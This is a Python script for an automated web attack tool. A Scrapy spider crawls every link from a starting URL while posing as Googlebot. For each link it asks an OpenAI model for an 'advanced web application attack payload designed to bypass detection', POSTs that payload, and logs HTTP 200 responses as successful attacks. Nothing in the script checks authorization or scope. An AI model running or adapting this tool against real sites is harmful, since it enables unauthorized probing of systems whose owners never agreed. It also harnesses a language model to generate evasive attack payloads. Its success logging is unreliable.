import scrapy
from scrapy.crawler import CrawlerProcess
import requests
import os
import sys
import signal

from openai import OpenAI

# Ensure the OpenAI API key is set in environment variables
api_key = os.getenv('OPENAI_API_KEY')
if not api_key:
    print("Error: OPENAI_API_KEY environment variable not set.")
    exit(1)

client = OpenAI(api_key=api_key)

class EndpointSpider(scrapy.Spider):
    name = 'endpoint_spider'
    custom_settings = {
        'LOG_LEVEL': 'WARNING',
        'USER_AGENT': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'REQUEST_FINGERPRINTER_IMPLEMENTATION': '2.7'
    }

    def __init__(self, url):
        super().__init__()
        if not (url.startswith('http://') or url.startswith('https://')):
            url = 'http://' + url  # Default to http if no scheme is provided
        self.start_urls = [url]

    def parse(self, response):
        for href in response.css('a::attr(href)').getall():
            full_url = response.urljoin(href)
            if not full_url.startswith('javascript'):
                yield response.follow(full_url, self.parse)
                self.fuzz_url(full_url)

    def fuzz_url(self, url):
        prompt = "Generate an advanced web application attack payload designed to bypass detection for the target."
        initial_payload = self.generate_payload(prompt)
        if initial_payload:
            self.send_payload(url, initial_payload)

    def generate_payload(self, prompt):
        try:
            response = client.completions.create(
                model="gpt-3.5-turbo-instruct",  # Update the model to a completions model
                prompt=prompt,
                max_tokens=100,
                temperature=0.5
            )
            return response.choices[0].text.strip()
        except Exception as e:
            print(f"Error in payload generation: {e}")
            return None

    def send_payload(self, url, payload):
        try:
            response = requests.post(url, data={"input": payload}, timeout=10)
            if response.status_code == 200:  # Assuming 200 as a success criterion for this example
                self.log_successful_attack(url, payload)
            else:
                print(f"Attack failed on {url}, status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending payload to {url}: {e}")

    def log_successful_attack(self, url, payload):
        message = f"URL: {url}, Payload: {payload}\n"
        print(message)
        with open("successful_attacks.txt", "a") as file:
            file.write(message)

def signal_handler(signal, frame):
    print('Scan stopped by user.')
    sys.exit(0)

if __name__ == "__main__":
    if not os.getenv('OPENAI_API_KEY'):
        print("Error: No OPENAI_API_KEY provided. Please set the API key and try again.")
        sys.exit(1)

    if len(sys.argv) != 2:
        print("Usage: python this_script.py <starting_url>")
        sys.exit(1)
    
    starting_url = sys.argv[1]
    process = CrawlerProcess(settings={
        'LOG_LEVEL': 'INFO',
        'USER_AGENT': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'REQUEST_FINGERPRINTER_IMPLEMENTATION': '2.7'
    })
    process.crawl(EndpointSpider, url=starting_url)
    process.start()
